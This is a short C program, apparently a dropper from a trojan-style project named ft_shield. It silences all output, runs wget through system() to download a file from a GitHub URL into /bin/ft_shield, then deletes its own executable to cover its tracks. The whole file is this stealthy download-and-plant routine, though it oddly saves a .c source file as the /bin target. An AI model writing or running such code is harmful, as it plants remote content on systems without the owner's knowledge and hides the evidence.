#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>

void download_file() {
    char cmd[256];
    memset(cmd, 0,256);

    const char *url = "https://raw.githubusercontent.com/HarounKr/ft_shield/refs/heads/master/xor.c";
    snprintf(cmd, sizeof(cmd), "wget -O /bin/ft_shield %s", url);
    system(cmd);
}
int main(int ac, char **av) {
    (void)ac;
    
    int fd = open("/dev/null", O_RDWR, 0);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);

    download_file();
    
    
    remove(av[0]);
    return 0;
}